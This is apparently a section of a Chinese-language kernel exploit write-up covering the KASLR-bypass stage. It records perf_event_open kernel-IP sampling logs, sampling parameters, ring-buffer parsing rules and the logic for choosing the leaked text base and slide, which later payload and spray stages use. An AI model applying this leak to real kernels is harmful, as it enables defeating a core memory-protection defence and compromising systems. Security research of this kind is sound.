# 02. perf KASLR 采样与地址结论

## 摘要

3.1 路径的第一段是 `rc_perf_leak_text_base()`。该函数通过 perf ring buffer 中的 kernel IP sample 选择 live kernel text base。本文只记录本轮实测可见的采样事实和源码中的选择规则。

## 实测采样

```text
[*] perf probe policy paranoid=-1
[*] perf probe open fd=3 errno=0 attr_size=136
[*] perf probe ring head=32752 tail=32752 records=2047 samples=2047 kernel=2047 lost=0 malformed=0
[*] perf probe sampled duration_ms=200 disable=0/0 min=ffffffe778d67770 max=ffffffe77ba02c5c
[*] perf probe candidate page=ffffffe779e00000 window=2044/2047 near=999 far=887 buckets=8
[+] perf probe text-base=ffffffe779e00000 min_kip=ffffffe778d67770 samples=2047
[+] slide-kaslr-perf-ok pid=23917 base=ffffffe779e00000 slide=0000002771e00000
[*] timing stage=kaslr pid=23917 elapsed_ms=202
```

## 方法

源码使用 `perf_event_open()` 建立短窗口采样：

| 字段 | 值 |
| --- | --- |
| `type` | `PERF_TYPE_SOFTWARE` |
| `config` | `PERF_COUNT_SW_CPU_CLOCK` |
| `sample_period` | `1` |
| `sample_type` | `PERF_SAMPLE_IP` |
| `exclude_user` | `1` |
| `RC_PERF_PAGES` | `8` |
| 默认窗口 | `PERF_PROBE_MSEC=200` |

ring 解析规则：

| 规则 | 作用 |
| --- | --- |
| `PERF_RECORD_SAMPLE` 后读取 8 字节 IP | 取得候选样本 |
| `misc & 7 == 1` | 只计 kernel sample |
| `ip >= 0xffffffc008000000` | 过滤非 text 候选 |
| `ip & 0xffffffffffe00000` | 2 MiB 页对齐归桶 |
| 记录 `lost` 与 `malformed` | 作为样本质量凭证 |

## 候选选择

选择器接受 `ffffffe779e00000` 的原因是：

| 条件 | 实测值 |
| --- | --- |
| ring 样本质量 | `2047/2047` 为 kernel sample，`lost=0`，`malformed=0` |
| 候选窗口覆盖 | `window=2044/2047` |
| 邻近桶特征 | `near=999`，`far=887` |
| 桶数量 | `buckets=8` |
| 输出 base | `base=ffffffe779e00000` |
| 输出 slide | `slide=0000002771e00000` |

该结论是单次启动内的 live base 结论。它不能外推为固定地址，也不能替代下一次启动的采样。

## 后续地址使用边界

当前源码在 `kaslr_done=1` 后使用 `text_addr()` 把 `target.h` 中的 image-relative 地址换算为本次启动地址。这个步骤只建立“后续计算使用同一个 base”的条件，不单独证明 mm/slab、payload、spray 或 route 已经成功。

因此，KASLR 结论的终止表述是：本轮 perf 采样足以支持 3.1 路径继续执行，且本轮后续日志应与 `base=ffffffe779e00000`、`slide=0000002771e00000` 保持一致。
